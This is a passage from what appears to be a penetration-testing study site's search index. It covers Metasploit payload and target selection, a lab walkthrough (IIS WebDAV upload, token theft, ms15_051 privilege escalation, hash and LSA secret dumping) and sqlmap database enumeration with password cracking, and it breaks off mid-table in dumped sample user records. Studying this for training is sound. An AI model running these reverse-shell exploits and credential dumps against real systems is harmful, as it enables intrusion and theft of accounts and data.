TCP Stager with UUID Support (Windows x64)\n   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)\n   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)\n   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager\n   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager\n   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)\n   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)\n   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)\n\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep -c meterpreter show payloads\n\n[*] 14\n</code></pre> <p>Add another <code>grep</code> command after the first one and search for <code>reverse_tcp</code>. <pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads\n\n   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager\n   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)\n\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep -c meterpreter grep reverse_tcp show payloads\n\n[*] 3\n</code></pre></p>  Selecting Payloads <pre><code>msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options\n\nModule options (exploit/windows/smb/ms17_010_eternalblue):\n\n   Name           Current Setting  Required  Description\n   ----           ---------------  --------  -----------\n   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'\n   RPORT          445              yes       The target port (TCP)\n   SMBDomain      .                no        (Optional) The Windows domain to use for authentication\n   SMBPass                         no        (Optional) The password for the specified username\n   SMBUser                         no        (Optional) The username to authenticate as\n   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.\n   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows 7 and Server 2008 R2 (x64) All Service Packs\n\n\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads\n\n   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager\n   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)\n   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)\n\n\nmsf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15\n\npayload =&gt; windows/x64/meterpreter/reverse_tcp\n</code></pre>","title":"Payloads"},{"location":"tools/msf/components/msf_targets/","text":"MSF - Target Selection <pre><code>msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; info\n\n       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability \n     Module: exploit/windows/browser/ie_execcommand_uaf\n   Platform: Windows\n       Arch: \n Privileged: No\n    License: Metasploit Framework License (BSD)\n       Rank: Good\n  Disclosed: 2012-09-14\n\nProvided by:\n  unknown\n  eromang\n  binjo\n  sinn3r &lt;sinn3r@metasploit.com&gt;\n  juan vazquez &lt;juan.vazquez@metasploit.com&gt;\n\nAvailable targets:\n  Id  Name\n  --  ----\n  0   Automatic\n  1   IE 7 on Windows XP SP3\n  2   IE 8 on Windows XP SP3\n  3   IE 7 on Windows Vista\n  4   IE 8 on Windows Vista\n  5   IE 8 on Windows 7\n  6   IE 9 on Windows 7\n\nCheck supported:\n  No\n\nBasic options:\n  Name       Current Setting  Required  Description\n  ----       ---------------  --------  -----------\n  OBFUSCATE  false            no        Enable JavaScript obfuscation\n  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n  SRVPORT    8080             yes       The local port to listen on.\n  SSL        false            no        Negotiate SSL for incoming connections\n  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n  URIPATH                     no        The URI to use for this exploit (default is random)\n\nPayload information:\n\nDescription:\n  This module exploits a vulnerability found in Microsoft Internet \n  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object \n  gets deleted in an unexpected manner, but the same memory is reused \n  again later in the CMshtmlEd::Exec() function, leading to a \n  use-after-free condition. Please note that this vulnerability has \n  been exploited since Sep 14, 2012. Also, note that \n  presently, this module has some target dependencies for the ROP \n  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present \n  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, \n  JRE 1.6.x or below must be installed (which is often the case).\n\nReferences:\n  https://cvedetails.com/cve/CVE-2012-4969/\n  OSVDB (85532)\n  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-063\n  http://technet.microsoft.com/en-us/security/advisory/2757760\n  http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/\n</code></pre> <pre><code>msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; options\n\nModule options (exploit/windows/browser/ie_execcommand_uaf):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   OBFUSCATE  false            no        Enable JavaScript obfuscation\n   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0\n   SRVPORT    8080             yes       The local port to listen on.\n   SSL        false            no        Negotiate SSL for incoming connections\n   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)\n   URIPATH                     no        The URI to use for this exploit (default is random)\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic\n\n\nmsf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets\n\nExploit targets:\n\n   Id  Name\n   --  ----\n   0   Automatic\n   1   IE 7 on Windows XP SP3\n   2   IE 8 on Windows XP SP3\n   3   IE 7 on Windows Vista\n   4   IE 8 on Windows Vista\n   5   IE 8 on Windows 7\n   6   IE 9 on Windows 7\n</code></pre> <p>We see options for both different versions of Internet Explorer and various Windows versions. Leaving the selection to <code>Automatic</code> will let msfconsole know that it needs to perform service detection on the given target before launching a successful attack.</p> <pre><code>msf6 exploit(windows/browser/ie_execcommand_uaf) &gt; show targets\n\nExploit targets:\n\n   Id  Name\n   --  ----\n   0   Automatic\n   1   IE 7 on Windows XP SP3\n   2   IE 8 on Windows XP SP3\n   3   IE 7 on Windows Vista\n   4   IE 8 on Windows Vista\n   5   IE 8 on Windows 7\n   6   IE 9 on Windows 7\n\n\nmsf6 exploit(windows/browser/ie_execcommand_uaf) &gt; set target 6\n</code></pre>","title":"Targets"},{"location":"tools/msf/sessions/msf_sessions_jobs/","text":"Listing Active Sessions <pre><code>msf6 exploit(windows/smb/psexec_psh) &gt; sessions\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information                 Connection\n  --  ----  ----                     -----------                 ----------\n  1         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ MS01  10.10.10.129:443 -&gt; 10.10.10.205:50501 (10.10.10.205)\n</code></pre> Interacting with a Session <pre><code>msf6 exploit(windows/smb/psexec_psh) &gt; sessions -i 1\n[*] Starting interaction with 1...\n\nmeterpreter &gt; \n</code></pre>  Running an Exploit as a Background Job <pre><code>msf6 exploit(multi/handler) &gt; exploit -j\n[*] Exploit running as background job 0.\n[*] Exploit completed, but no session was created.\n\n[*] Started reverse TCP handler on 10.10.14.34:4444\n</code></pre> Listing Running Jobs <pre><code>msf6 exploit(multi/handler) &gt; jobs -l\n\nJobs\n====\n\n Id  Name                    Payload                    Payload opts\n --  ----                    -------                    ------------\n 0   Exploit: multi/handler  generic/shell_reverse_tcp  tcp://10.10.14.34:4444\n</code></pre>","title":"Sessions & Jobs"},{"location":"tools/msf/sessions/msf_sessions_meterpreter/","text":"<p>MSF - Configuring Exploit &amp; Payload <pre><code>msf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; set RHOST 10.10.10.15\n\nRHOST =&gt; 10.10.10.15\n\n\nmsf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; set LHOST tun0\n\nLHOST =&gt; tun0\n\n\nmsf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; run\n\n[*] Started reverse TCP handler on 10.10.14.26:4444 \n[*] Checking /metasploit28857905.asp\n[*] Uploading 612435 bytes to /metasploit28857905.txt...\n[*] Moving /metasploit28857905.txt to /metasploit28857905.asp...\n[*] Executing /metasploit28857905.asp...\n[*] Sending stage (175174 bytes) to 10.10.10.15\n[*] Deleting /metasploit28857905.asp (this doesn't always work)...\n[!] Deletion failed on /metasploit28857905.asp [403 Forbidden]\n[*] Meterpreter session 1 opened (10.10.14.26:4444 -&gt; 10.10.10.15:1030) at 2020-09-03 10:10:21 +0000\n\nmeterpreter &gt; \n</code></pre></p> <p>We can see a <code>.asp</code> file named <code>metasploit28857905</code> exists on the target system at this very moment. Once the Meterpreter shell is obtained, it will reside within memory. Therefore, the file is not needed, and removal was attempted by <code>msfconsole</code>, which failed due to access permissions.</p> <p>Upon attempting to see which user we are running on, we get an access denied message. We should try migrating our process to a user with more privilege.</p> <pre><code>meterpreter &gt; getuid\n\n[-] 1055: Operation failed: Access is denied.\n\n\nmeterpreter &gt; ps\n\nProcess List\n============\n\n PID   PPID  Name               Arch  Session  User                          Path\n ---   ----  ----               ----  -------  ----                          ----\n 0     0     [System Process]                                                \n 4     0     System                                                          \n 216   1080  cidaemon.exe                                                    \n 272   4     smss.exe                                                        \n 292   1080  cidaemon.exe                                                    \n&lt;...SNIP...&gt;\n\n 1712  396   alg.exe                                                         \n 1836  592   wmiprvse.exe       x86   0        NT AUTHORITY\\NETWORK SERVICE  C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n 1920  396   dllhost.exe                                                     \n 2232  3552  svchost.exe        x86   0                                      C:\\WINDOWS\\Temp\\rad9E519.tmp\\svchost.exe\n 2312  592   wmiprvse.exe                                                    \n 3552  1460  w3wp.exe           x86   0        NT AUTHORITY\\NETWORK SERVICE  c:\\windows\\system32\\inetsrv\\w3wp.exe\n 3624  592   davcdata.exe       x86   0        NT AUTHORITY\\NETWORK SERVICE  C:\\WINDOWS\\system32\\inetsrv\\davcdata.exe\n 4076  1080  cidaemon.exe                                                    \n\n\nmeterpreter &gt; steal_token 1836\n\nStolen token with username: NT AUTHORITY\\NETWORK SERVICE\n\n\nmeterpreter &gt; getuid\n\nServer username: NT AUTHORITY\\NETWORK SERVICE\n</code></pre> <p>Now that we have established at least some privilege level in the system, it is time to escalate that privilege. So, we look around for anything interesting, and in the <code>C:\\Inetpub\\</code> location, we find an interesting folder named <code>AdminScripts</code>. However, unfortunately, we do not have permission to read what is inside it.</p> <p>MSF - Interacting with the Target <pre><code>c:\\Inetpub&gt;dir\n\ndir\n Volume in drive C has no label.\n Volume Serial Number is 246C-D7FE\n\n Directory of c:\\Inetpub\n\n04/12/2017  05:17 PM    &lt;DIR&gt;          .\n04/12/2017  05:17 PM    &lt;DIR&gt;          ..\n04/12/2017  05:16 PM    &lt;DIR&gt;          AdminScripts\n09/03/2020  01:10 PM    &lt;DIR&gt;          wwwroot\n               0 File(s)              0 bytes\n               4 Dir(s)  18,125,160,448 bytes free\n\n\nc:\\Inetpub&gt;cd AdminScripts\n\ncd AdminScripts\nAccess is denied.\n</code></pre></p> <p>We can run the local exploit suggester module, attaching it to the currently active Meterpreter session.</p> <pre><code>meterpreter &gt; bg\n\nBackground session 1? [y/N]  y\n\n\nmsf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; search local_exploit_suggester\n\nMatching Modules\n================\n\n   #  Name                                      Disclosure Date  Rank    Check  Description\n   -  ----                                      ---------------  ----    -----  -----------\n   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester\n\n\nmsf6 exploit(windows/iis/iis_webdav_upload_asp) &gt; use 0\nmsf6 post(multi/recon/local_exploit_suggester) &gt; show options\n\nModule options (post/multi/recon/local_exploit_suggester):\n\n   Name             Current Setting  Required  Description\n   ----             ---------------  --------  -----------\n   SESSION                           yes       The session to run this module on\n   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits\n\n\nmsf6 post(multi/recon/local_exploit_suggester) &gt; set SESSION 1\n\nSESSION =&gt; 1\n\n\nmsf6 post(multi/recon/local_exploit_suggester) &gt; run\n\n[*] 10.10.10.15 - Collecting local exploits for x86/windows...\n[*] 10.10.10.15 - 34 exploit checks are being tried...\nnil versions are discouraged and will be deprecated in Rubygems 4\n[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.\n[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.\n[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.\n[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.\n[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.\n[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.\n[*] Post module execution completed\nmsf6 post(multi/recon/local_exploit_suggester) &gt; \n</code></pre> <p>Running the recon module presents us with a multitude of options. Going through each separate one, we land on the <code>ms15_051_client_copy_image</code> entry, which proves to be successful.</p> <pre><code>msf6 post(multi/recon/local_exploit_suggester) &gt; use exploit/windows/local/ms15_051_client_copy_images\n\n[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp\n\n\nmsf6 exploit(windows/local/ms15_051_client_copy_image) &gt; show options\n\nModule options (exploit/windows/local/ms15_051_client_copy_image):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION                   yes       The session to run this module on.\n\n\nPayload options (windows/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     46.101.239.181   yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows x86\n\n\nmsf6 exploit(windows/local/ms15_051_client_copy_image) &gt; set session 1\n\nsession =&gt; 1\n\n\nmsf6 exploit(windows/local/ms15_051_client_copy_image) &gt; set LHOST tun0\n\nLHOST =&gt; tun0\n\n\nmsf6 exploit(windows/local/ms15_051_client_copy_image) &gt; run\n\n[*] Started reverse TCP handler on 10.10.14.26:4444 \n[*] Launching notepad to host the exploit...\n[+] Process 844 launched.\n[*] Reflectively injecting the exploit DLL into 844...\n[*] Injecting exploit into 844...\n[*] Exploit injected. Injecting payload into 844...\n[*] Payload injected. Executing exploit...\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.\n[*] Sending stage (175174 bytes) to 10.10.10.15\n[*] Meterpreter session 2 opened (10.10.14.26:4444 -&gt; 10.10.10.15:1031) at 2020-09-03 10:35:01 +0000\n\n\nmeterpreter &gt; getuid\n\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre> <p>From here, we can proceed to use the plethora of Meterpreter functionalities. Extracting hashes, impersonating any process we want, and others.</p> <pre><code>meterpreter &gt; hashdump\n\nAdministrator:500:c74761604a24f0dfd0a9ba2c30e462cf:d6908f022af0373e9e21b8a241c86dca:::\nASPNET:1007:3f71d62ec68a06a39721cb3f54f04a3b:edc0d5506804653f58964a2376bbd769:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nIUSR_GRANPA:1003:a274b4532c9ca5cdf684351fab962e86:6a981cb5e038b2d8b713743a50d89c88:::\nIWAM_GRANPA:1004:95d112c4da2348b599183ac6b1d67840:a97f39734c21b3f6155ded7821d04d16:::\nLakis:1009:f927b0679b3cc0e192410d9b0b40873c:3064b6fc432033870c6730228af7867c:::\nSUPPORT_388945a0:1001:aad3b435b51404eeaad3b435b51404ee:8ed3993efb4e6476e4f75caebeca93e6:::\n\n\nmeterpreter &gt; lsa_dump_sam\n\n[+] Running as SYSTEM\n[*] Dumping SAM\nDomain : GRANNY\nSysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb\nLocal SID : S-1-5-21-1709780765-3897210020-3926566182\n\nSAMKey : 37ceb48682ea1b0197c7ab294ec405fe\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash LM  : c74761604a24f0dfd0a9ba2c30e462cf\n  Hash NTLM: d6908f022af0373e9e21b8a241c86dca\n\nRID  : 000001f5 (501)\nUser : Guest\n\nRID  : 000003e9 (1001)\nUser : SUPPORT_388945a0\n  Hash NTLM: 8ed3993efb4e6476e4f75caebeca93e6\n\nRID  : 000003eb (1003)\nUser : IUSR_GRANPA\n  Hash LM  : a274b4532c9ca5cdf684351fab962e86\n  Hash NTLM: 6a981cb5e038b2d8b713743a50d89c88\n\nRID  : 000003ec (1004)\nUser : IWAM_GRANPA\n  Hash LM  : 95d112c4da2348b599183ac6b1d67840\n  Hash NTLM: a97f39734c21b3f6155ded7821d04d16\n\nRID  : 000003ef (1007)\nUser : ASPNET\n  Hash LM  : 3f71d62ec68a06a39721cb3f54f04a3b\n  Hash NTLM: edc0d5506804653f58964a2376bbd769\n\nRID  : 000003f1 (1009)\nUser : Lakis\n  Hash LM  : f927b0679b3cc0e192410d9b0b40873c\n  Hash NTLM: 3064b6fc432033870c6730228af7867c\n</code></pre> <pre><code>meterpreter &gt; lsa_dump_secrets\n\n[+] Running as SYSTEM\n[*] Dumping LSA secrets\nDomain : GRANNY\nSysKey : 11b5033b62a3d2d6bb80a0d45ea88bfb\n\nLocal name : GRANNY ( S-1-5-21-1709780765-3897210020-3926566182 )\nDomain name : xyz\n\nPolicy subsystem is : 1.7\nLSA Key : ada60ee248094ce782807afae1711b2c\n\nSecret  : aspnet_WP_PASSWORD\ncur/text: Q5C'181g16D'=F\n\nSecret  : D6318AF1-462A-48C7-B6D9-ABB7CCD7975E-SRV\ncur/hex : e9 1c c7 89 aa 02 92 49 84 58 a4 26 8c 7b 1e c2 \n\nSecret  : DPAPI_SYSTEM\ncur/hex : 01 00 00 00 7a 3b 72 f3 cd ed 29 ce b8 09 5b b0 e2 63 73 8a ab c6 ca 49 2b 31 e7 9a 48 4f 9c b3 10 fc fd 35 bd d7 d5 90 16 5f fc 63 \n    full: 7a3b72f3cded29ceb8095bb0e263738aabc6ca492b31e79a484f9cb310fcfd35bdd7d590165ffc63\n    m/u : 7a3b72f3cded29ceb8095bb0e263738aabc6ca49 / 2b31e79a484f9cb310fcfd35bdd7d590165ffc63\n\nSecret  : L$HYDRAENCKEY_28ada6da-d622-11d1-9cb9-00c04fb16e75\ncur/hex : 52 53 41 32 48 00 00 00 00 02 00 00 3f 00 00 00 01 00 01 00 b3 ec 6b 48 4c ce e5 48 f1 cf 87 4f e5 21 00 39 0c 35 87 88 f2 51 41 e2 2a e0 01 83 a4 27 92 b5 30 12 aa 70 08 24 7c 0e de f7 b0 22 69 1e 70 97 6e 97 61 d9 9f 8c 13 fd 84 dd 75 37 35 61 89 c8 00 00 00 00 00 00 00 00 97 a5 33 32 1b ca 65 54 8e 68 81 fe 46 d5 74 e8 f0 41 72 bd c6 1e 92 78 79 28 ca 33 10 ff 86 f0 00 00 00 00 45 6d d9 8a 7b 14 2d 53 bf aa f2 07 a1 20 29 b7 0b ac 1c c4 63 a4 41 1c 64 1f 41 57 17 d1 6f d5 00 00 00 00 59 5b 8e 14 87 5f a4 bc 6d 8b d4 a9 44 6f 74 21 c3 bd 8f c5 4b a3 81 30 1a f6 e3 71 10 94 39 52 00 00 00 00 9d 21 af 8c fe 8f 9c 56 89 a6 f4 33 f0 5a 54 e2 21 77 c2 f4 5c 33 42 d8 6a d6 a5 bb 96 ef df 3d 00 00 00 00 8c fa 52 cb da c7 10 71 10 ad 7f b6 7d fb dc 47 40 b2 0b d9 6a ff 25 bc 5f 7f ae 7b 2b b7 4c c4 00 00 00 00 89 ed 35 0b 84 4b 2a 42 70 f6 51 ab ec 76 69 23 57 e3 8f 1b c3 b1 99 9e 31 09 1d 8c 38 0d e7 99 57 36 35 06 bc 95 c9 0a da 16 14 34 08 f0 8e 9a 08 b9 67 8c 09 94 f7 22 2e 29 5a 10 12 8f 35 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 \n\nSecret  : L$RTMTIMEBOMB_1320153D-8DA3-4e8e-B27B-0D888223A588\ncur/hex : 00 f2 d1 31 e2 11 d3 01 \n\nSecret  : L$TermServLiceningSignKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d\n\nSecret  : L$TermServLicensingExchKey-12d4b7c8-77d5-11d1-8c24-00c04fa3080d\n\nSecret  : L$TermServLicensingServerId-12d4b7c8-77d5-11d1-8c24-00c04fa3080d\n\nSecret  : L$TermServLicensingStatus-12d4b7c8-77d5-11d1-8c24-00c04fa3080d\n\nSecret  : L${6B3E6424-AF3E-4bff-ACB6-DA535F0DDC0A}\ncur/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e ee da a8 bb f6 1a b1 f4 03 cf 7a f1 7f 4c bc fc b4 84 36 40 6a 34 f9 89 56 aa f4 43 ef 85 58 38 3b a8 34 f0 dc c3 7f \nold/hex : ca 66 0b f5 42 90 b1 2b 64 a0 c5 87 a7 db 9a 8a 2e c8 e9 13 e6 5f 17 a9 42 93 c2 e3 4c 8c c3 59 b8 c2 dd 12 a9 6a b2 4c 22 61 5f 1f ab ab ff 0c e0 93 e2 e6 bf ea e7 16 \n\nSecret  : NL$KM\ncur/hex : 91 de 7a b2 cb 48 86 4d cf a3 df ae bb 3d 01 40 ba 37 2e d9 56 d1 d7 85 cf 08 82 93 a2 ce 5f 40 66 02 02 e1 1a 9c 7f bf 81 91 f0 0f f2 af da ed ac 0a 1e 45 9e 86 9f e7 bd 36 eb b2 2a 82 83 2f \n\nSecret  : SAC\n\nSecret  : SAI\n\nSecret  : SCM:{148f1a14-53f3-4074-a573-e1ccd344e1d0}\n\nSecret  : SCM:{3D14228D-FBE1-11D0-995D-00C04FD919C1}\n\nSecret  : _SC_Alerter / service 'Alerter' with username : NT AUTHORITY\\LocalService\n\nSecret  : _SC_ALG / service 'ALG' with username : NT AUTHORITY\\LocalService\n\nSecret  : _SC_aspnet_state / service 'aspnet_state' with username : NT AUTHORITY\\NetworkService\n\nSecret  : _SC_Dhcp / service 'Dhcp' with username : NT AUTHORITY\\NetworkService\n\nSecret  : _SC_Dnscache / service 'Dnscache' with username : NT AUTHORITY\\NetworkService\n\nSecret  : _SC_LicenseService / service 'LicenseService' with username : NT AUTHORITY\\NetworkService\n\nSecret  : _SC_LmHosts / service 'LmHosts' with username : NT AUTHORITY\\LocalService\n\nSecret  : _SC_MSDTC / service 'MSDTC' with username : NT AUTHORITY\\NetworkService\n\nSecret  : _SC_RpcLocator / service 'RpcLocator' with username : NT AUTHORITY\\NetworkService\n\nSecret  : _SC_RpcSs / service 'RpcSs' with username : NT AUTHORITY\\NetworkService\n\nSecret  : _SC_stisvc / service 'stisvc' with username : NT AUTHORITY\\LocalService\n\nSecret  : _SC_TlntSvr / service 'TlntSvr' with username : NT AUTHORITY\\LocalService\n\nSecret  : _SC_WebClient / service 'WebClient' with username : NT AUTHORITY\\LocalService\n</code></pre> <p>From this point, if the machine was connected to a more extensive network, we could use this loot to pivot through the system, gain access to internal resources and impersonate users with a higher level of access if the overall security posture of the network is weak.</p>","title":"Meterpreter"},{"location":"tools/sqlmap/advanced_db_enumeration/","text":"DB Schema Enumeration <p>If we wanted to retrieve the structure of all of the tables so that we can have a complete overview of the database architecture:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --schema\n\n...SNIP...\nDatabase: master\nTable: log\n[3 columns]\n+--------+--------------+\n| Column | Type         |\n+--------+--------------+\n| date   | datetime     |\n| agent  | varchar(512) |\n| id     | int(11)      |\n+--------+--------------+\n\nDatabase: owasp10\nTable: accounts\n[4 columns]\n+-------------+---------+\n| Column      | Type    |\n+-------------+---------+\n| cid         | int(11) |\n| mysignature | text    |\n| password    | text    |\n| username    | text    |\n+-------------+---------+\n...\nDatabase: testdb\nTable: data\n[2 columns]\n+---------+---------+\n| Column  | Type    |\n+---------+---------+\n| content | blob    |\n| id      | int(11) |\n+---------+---------+\n\nDatabase: testdb\nTable: users\n[3 columns]\n+---------+---------------+\n| Column  | Type          |\n+---------+---------------+\n| id      | int(11)       |\n| name    | varchar(500)  |\n| surname | varchar(1000) |\n+---------+---------------+\n</code></pre>  Searching for Data <p>We can search for databases, tables, and columns of interest, by using the <code>--search</code> option. This option enables us to search for identifier names by using the <code>LIKE</code> operator. For example, if we are looking for all of the table names containing the keyword <code>user</code>:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --search -T user\n\n...SNIP...\n[14:24:19] [INFO] searching tables LIKE 'user'\nDatabase: testdb\n[1 table]\n+-----------------+\n| users           |\n+-----------------+\n\nDatabase: master\n[1 table]\n+-----------------+\n| users           |\n+-----------------+\n\nDatabase: information_schema\n[1 table]\n+-----------------+\n| USER_PRIVILEGES |\n+-----------------+\n\nDatabase: mysql\n[1 table]\n+-----------------+\n| user            |\n+-----------------+\n\ndo you want to dump found table(s) entries? [Y/n] \n...SNIP...\n</code></pre> <p>We could also have tried to search for all column names based on a specific keyword (e.g. <code>pass</code>):</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --search -C pass\n\n...SNIP...\ncolumns LIKE 'pass' were found in the following databases:\nDatabase: owasp10\nTable: accounts\n[1 column]\n+----------+------+\n| Column   | Type |\n+----------+------+\n| password | text |\n+----------+------+\n\nDatabase: master\nTable: users\n[1 column]\n+----------+--------------+\n| Column   | Type         |\n+----------+--------------+\n| password | varchar(512) |\n+----------+--------------+\n\nDatabase: mysql\nTable: user\n[1 column]\n+----------+----------+\n| Column   | Type     |\n+----------+----------+\n| Password | char(41) |\n+----------+----------+\n\nDatabase: mysql\nTable: servers\n[1 column]\n+----------+----------+\n| Column   | Type     |\n+----------+----------+\n| Password | char(64) |\n+----------+----------+\n</code></pre>  Password Enumeration and Cracking <p>Once we identify a table containing passwords (e.g. <code>master.users</code>), we can retrieve that table with the <code>-T</code> option:</p> <pre><code>secops@kali[/kali]$ sqlmap -u \"http://www.example.com/?id=1\" --dump -D master -T users\n\n...SNIP...\n[14:31:41] [INFO] fetching columns for table 'users' in database 'master'\n[14:31:41] [INFO] fetching entries for table 'users' in database 'master'\n[14:31:41] [INFO] recognized possible password hashes in column 'password'\ndo you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N\n\ndo you want to crack them via a dictionary-based attack? [Y/n/q] Y\n\n[14:31:41] [INFO] using hash method 'sha1_generic_passwd'\nwhat dictionary do you want to use?\n[1] default dictionary file '/usr/local/share/sqlmap/data/txt/wordlist.tx_' (press Enter)\n[2] custom dictionary file\n[3] file with list of dictionary files\n&gt; 1\n[14:31:41] [INFO] using default dictionary\ndo you want to use common password suffixes? (slow!) [y/N] N\n\n[14:31:41] [INFO] starting dictionary-based cracking (sha1_generic_passwd)\n[14:31:41] [INFO] starting 8 processes \n[14:31:41] [INFO] cracked password '05adrian' for hash '70f361f8a1c9035a1d972a209ec5e8b726d1055e'                                                                                                         \n[14:31:41] [INFO] cracked password '1201Hunt' for hash 'df692aa944eb45737f0b3b3ef906f8372a3834e9'                                                                                                         \n...SNIP...\n[14:31:47] [INFO] cracked password 'Zc1uowqg6' for hash '0ff476c2676a2e5f172fe568110552f2e910c917'                                                                                                        \nDatabase: master                                                                                                                                                                                          \nTable: users\n[32 entries]\n+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+\n| id | cc               | name              | email                       | phone        | address                | birthday          | password                                                    | occupation                                        |\n+----+------------------+-------------------+-----------------------------+--------------+------------------------+-------------------+-------------------------------------------------------------+---------------------------------------------------+\n| 1  | 5387278172507117 | Maynard Rice      | MaynardMRice@yahoo.com      | 281-559-0172 | 1698 Bird Spring Lane  | March 1 1958      | 9a0f092c8d52eaf3ea423cef8485702ba2b3deb9 (3052)             | Linemen                                           |\n| 2  | 4539475107874477 | Julio Thomas      | JulioWThomas@gmail.com      | 973-426-5961 | 1207 Granville Lane    | February 14 1972  | 10945aa229a6d569f226976b22ea0e900a1fc219 (taqris)           | Agricultural product sorter                       |\n| 3  | 4716522746974567 | Kenneth Maloney   | KennethTMaloney@gmail.com   | 954-617-0424 | 2811 Kenwood Place     | May 14 1989       | a5e68cd37ce8ec021d5ccb9392f4980b3c8b3295 (hibiskus)         | 